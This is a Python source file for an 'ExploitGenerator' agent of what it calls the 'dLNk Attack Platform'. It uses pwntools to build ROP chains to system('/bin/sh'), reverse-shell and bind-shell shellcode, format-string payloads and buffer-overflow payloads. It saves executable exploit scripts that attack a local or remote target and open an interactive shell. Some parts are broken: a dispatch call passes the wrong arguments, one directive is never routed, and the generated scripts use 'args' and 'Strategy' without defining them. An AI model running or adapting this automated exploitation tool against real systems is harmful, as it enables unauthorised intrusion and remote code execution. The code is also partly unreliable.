"""
Exploit Generator using pwntools
สร้าง exploits อัตโนมัติสำหรับช่องโหว่ที่พบ
"""

import os
import asyncio
from typing import Dict, List, Any, Optional
from datetime import datetime
from core.logger import log
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase

try:
    from pwn import (
        fmtstr_payload, context, process, remote, ELF, ROP,
    p8, p16, p32, p64,
    u8, u16, u32, u64,
    log as pwnlog, cyclic, cyclic_find,
    asm, disasm, shellcraft
)
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    log.warning("[ExploitGenerator] pwntools not installed. Exploit generation disabled.")


class ExploitGenerator(BaseAgent):
    """
    Generate exploits using pwntools
    
    Features:
    - ROP chain generation
    - Shellcode generation
    - Format string exploits
    - Buffer overflow exploits
    """
    
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, workspace_dir: str = None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        if workspace_dir is None:
            workspace_dir = os.getenv("WORKSPACE_DIR", "workspace")
        self.workspace_dir = workspace_dir
        os.makedirs(workspace_dir, exist_ok=True)
        
        if not PWNTOOLS_AVAILABLE:
            log.error("[ExploitGenerator] pwntools not installed. Install with: pip install pwntools")
    
    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main entry point for ExploitGenerator
        
        Args:
            directive: "rop", "shellcode", "format_string", "buffer_overflow"
            context: Dict containing binary_path, crash_info, and other parameters
        
        Returns:
            AgentData with execution results
        """
        try:
            if not PWNTOOLS_AVAILABLE:
                return AgentData(
                    agent_name="ExploitGenerator",
                    success=False,
                    data={"error": "pwntools not installed"}
                )
            
            if directive == "rop":
                result = await self.generate_rop_chain(
                    context.get("binary_path"),
                    context.get("crash_info", {})
                )
            elif directive == "format_string":
                result = await self.generate_format_string_exploit(context)
            elif directive == "shellcode":
                result = await self.generate_shellcode(context)
            else:
                result = await self.generate_format_string_exploit(context)
            
            return AgentData(
                agent_name="ExploitGenerator",
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[ExploitGenerator] Error: {e}")
            return AgentData(
                agent_name="ExploitGenerator",
                success=False,
                data={"error": str(e)}
            )
    

    async def generate_rop_chain(self, binary_path: str, crash_info: Dict) -> Dict:
        """
        Generate ROP chain for exploitation
        
        Args:
            binary_path: Path to target binary
            crash_info: Information about the crash
        
        Returns:
            Dict with ROP chain and exploit
        """
        if not PWNTOOLS_AVAILABLE:
            return {
                "success": False,
                "error": "pwntools not installed"
            }
        
        try:
            log.info(f"[ExploitGenerator] Generating ROP chain for {binary_path}")
            
            # Load binary
            elf = ELF(binary_path)
            rop = ROP(elf)
            
            # Check if libc is available
            has_libc = False
            try:
                libc = elf.libc
                has_libc = True
                log.info("[ExploitGenerator] libc detected")
            except Exception as e:
                log.warning("[ExploitGenerator] No libc found, using binary gadgets only")
            
            # Build ROP chain based on available gadgets
            rop_chain = b""
            exploit_type = "unknown"
            
            if has_libc:
                # Try to build system('/bin/sh') chain
                try:
                    # Find /bin/sh string
                    binsh = next(elf.search(b'/bin/sh\x00'))
                    
                    # Build ROP chain
                    rop.call('system', [binsh])
                    rop_chain = bytes(rop)
                    exploit_type = "system_binsh"
                    
                    log.success("[ExploitGenerator] Generated system('/bin/sh') ROP chain")
                except Exception as e:
                    log.warning("[ExploitGenerator] Could not build system() chain")
            
            # If no libc or system() failed, try execve
            if not rop_chain:
                try:
                    # Build execve chain
                    rop.execve('/bin/sh', 0, 0)
                    rop_chain = bytes(rop)
                    exploit_type = "execve"
                    
                    log.success("[ExploitGenerator] Generated execve ROP chain")
                except Exception as e:
                    log.warning("[ExploitGenerator] Could not build execve chain")
            
            # Generate full exploit
            exploit_code = self._generate_exploit_script(
                binary_path, 
                rop_chain, 
                crash_info,
                exploit_type
            )
            
            # Save exploit
            exploit_file = self._save_exploit(binary_path, exploit_code)
            
            return {
                "success": True,
                "binary": binary_path,
                "exploit_type": exploit_type,
                "rop_chain": rop_chain.hex(),
                "rop_chain_length": len(rop_chain),
                "gadgets_used": len(rop.gadgets),
                "exploit_file": exploit_file,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[ExploitGenerator] ROP chain generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def generate_shellcode(self, arch: str = "amd64", payload_type: str = "shell") -> Dict:
        """
        Generate shellcode for target architecture
        
        Args:
            arch: Target architecture (amd64, i386, arm, etc.)
            payload_type: Type of payload (shell, reverse_shell, bind_shell)
        
        Returns:
            Dict with shellcode
        """
        if not PWNTOOLS_AVAILABLE:
            return {
                "success": False,
                "error": "pwntools not installed"
            }
        
        try:
            log.info(f"[ExploitGenerator] Generating {payload_type} shellcode for {arch}")
            
            # Set context
            context.arch = arch
            context.os = 'linux'
            
            # Generate shellcode based on type
            if payload_type == "shell":
                shellcode = asm(shellcraft.sh())
            elif payload_type == "reverse_shell":
                # Default to localhost:4444
                shellcode = asm(shellcraft.connect('127.0.0.1', 4444) + shellcraft.sh())
            elif payload_type == "bind_shell":
                shellcode = asm(shellcraft.bindsh(4444))
            else:
                return {
                    "success": False,
                    "error": f"Unknown payload type: {payload_type}"
                }
            
            return {
                "success": True,
                "arch": arch,
                "payload_type": payload_type,
                "shellcode": shellcode.hex(),
                "shellcode_length": len(shellcode),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[ExploitGenerator] Shellcode generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def generate_format_string_exploit(self, binary_path: str, offset: int, target_address: int) -> Dict:
        """
        Generate format string exploit
        
        Args:
            binary_path: Path to target binary
            offset: Format string offset
            target_address: Address to overwrite
        
        Returns:
            Dict with format string exploit
        """
        if not PWNTOOLS_AVAILABLE:
            return {
                "success": False,
                "error": "pwntools not installed"
            }
        
        try:
            log.info(f"[ExploitGenerator] Generating format string exploit for {binary_path}")
            
            # Load binary
            elf = ELF(binary_path)
            
            # Build format string payload
            # Write arbitrary value to target address
            writes = {target_address: 0xdeadbeef}
            
            payload = fmtstr_payload(offset, writes, write_size='short')
            
            return {
                "success": True,
                "binary": binary_path,
                "offset": offset,
                "target_address": hex(target_address),
                "payload": payload.hex(),
                "payload_length": len(payload),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[ExploitGenerator] Format string exploit generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def generate_buffer_overflow_exploit(
        self, 
        binary_path: str, 
        offset: int, 
        return_address: int = None
    ) -> Dict:
        """
        Generate buffer overflow exploit
        
        Args:
            binary_path: Path to target binary
            offset: Offset to return address
            return_address: Address to jump to (optional)
        
        Returns:
            Dict with buffer overflow exploit
        """
        if not PWNTOOLS_AVAILABLE:
            return {
                "success": False,
                "error": "pwntools not installed"
            }
        
        try:
            log.info(f"[ExploitGenerator] Generating buffer overflow exploit for {binary_path}")
            
            # Load binary
            elf = ELF(binary_path)
            
            # If no return address specified, try to find win function or use shellcode
            if not return_address:
                # Try to find a win function
                for func in elf.functions:
                    if 'win' in func or 'flag' in func or 'shell' in func:
                        return_address = elf.functions[func]
                        log.info(f"[ExploitGenerator] Found target function: {func} at {hex(return_address)}")
                        break
                
                # If no win function, we'll need to use shellcode
                if not return_address:
                    log.info("[ExploitGenerator] No win function found, will use shellcode")
                    return_address = 0x41414141  # Placeholder
            
            # Build payload
            payload = b"A" * offset
            payload += p64(return_address) if elf.bits == 64 else p32(return_address)
            
            # Generate full exploit script
            exploit_code = self._generate_bof_exploit_script(
                binary_path,
                offset,
                return_address,
                elf.bits
            )
            
            # Save exploit
            exploit_file = self._save_exploit(binary_path, exploit_code)
            
            return {
                "success": True,
                "binary": binary_path,
                "offset": offset,
                "return_address": hex(return_address),
                "payload": payload.hex(),
                "payload_length": len(payload),
                "exploit_file": exploit_file,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[ExploitGenerator] Buffer overflow exploit generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute exploit generator"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _generate_exploit_script(
        self, 
        binary_path: str, 
        rop_chain: bytes, 
        crash_info: Dict,
        exploit_type: str
    ) -> str:
        """Generate Python exploit script"""
        
        script = f"""#!/usr/bin/env python3
# Exploit generated by dLNk Attack Platform
# Target: {binary_path}
# Type: {exploit_type}
# Generated: {datetime.now().isoformat()}

from pwn import (
    context, process, remote, ELF, ROP,
    p8, p16, p32, p64,
    u8, u16, u32, u64,
    log as pwnlog, cyclic, cyclic_find,
    asm, disasm, shellcraft
)

# Set context
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Target binary
binary = '{binary_path}'
elf = ELF(binary)

# ROP chain
rop_chain = bytes.fromhex('{rop_chain.hex()}')

# Build payload
offset = {crash_info.get('offset', 0)}
payload = b"A" * offset
payload += rop_chain

# Launch exploit
if args.REMOTE:
    p = remote(args.HOST, int(args.PORT))
else:
    p = process(binary)

# Send payload
p.sendline(payload)

# Get shell
p.interactive()
"""
        
        return script
    
    def _generate_bof_exploit_script(
        self,
        binary_path: str,
        offset: int,
        return_address: int,
        bits: int
    ) -> str:
        """Generate buffer overflow exploit script"""
        
        pack_func = "p64" if bits == 64 else "p32"
        
        script = f"""#!/usr/bin/env python3
# Buffer Overflow Exploit generated by dLNk Attack Platform
# Target: {binary_path}
# Generated: {datetime.now().isoformat()}

from pwn import (
    context, process, remote, ELF, ROP,
    p8, p16, p32, p64,
    u8, u16, u32, u64,
    log as pwnlog, cyclic, cyclic_find,
    asm, disasm, shellcraft
)

# Set context
context.arch = 'amd64' if {bits} == 64 else 'i386'
context.os = 'linux'
context.log_level = 'info'

# Target binary
binary = '{binary_path}'
elf = ELF(binary)

# Exploit parameters
offset = {offset}
return_address = {hex(return_address)}

# Build payload
payload = b"A" * offset
payload += {pack_func}(return_address)

# Launch exploit
if args.REMOTE:
    p = remote(args.HOST, int(args.PORT))
else:
    p = process(binary)

# Send payload
p.sendline(payload)

# Get shell
p.interactive()
"""
        
        return script
    
    def _save_exploit(self, binary_path: str, exploit_code: str) -> str:
        """Save exploit script to file"""
        
        filename = f"{self.workspace_dir}/exploit_{os.path.basename(binary_path)}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        
        with open(filename, 'w') as f:
            f.write(exploit_code)
        
        # Make executable
        os.chmod(filename, 0o755)
        
        log.success(f"[ExploitGenerator] Exploit saved to {filename}")
        return filename

